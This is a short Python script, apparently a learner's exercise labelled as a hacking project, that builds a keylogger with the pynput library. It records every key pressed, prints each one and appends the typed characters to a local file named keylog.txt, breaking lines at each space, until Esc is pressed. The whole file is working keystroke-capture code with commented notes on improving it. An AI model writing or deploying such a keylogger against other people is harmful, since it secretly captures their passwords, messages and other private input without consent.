#!/usr/bin/env python3
# CREATING A KEY LOGGER (hacking) environment
import pynput
from pynput.keyboard import Key, Listener

# Now I need to make this useful in a meaningful way. I need
# to be able to save the key presses to a text file.
count = 0
keys = []


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

# With the way the script is written write now, it is very
# un readable in the text file. I need to make it to where
# each line in the txt file is a word. and to do that I need
# to make it so that every time someone hits the space bar
# it saves those key presses to that line and then goes to
# the next line.


def write_file(keys):
    with open("keylog.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:  # .find looks into the string
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
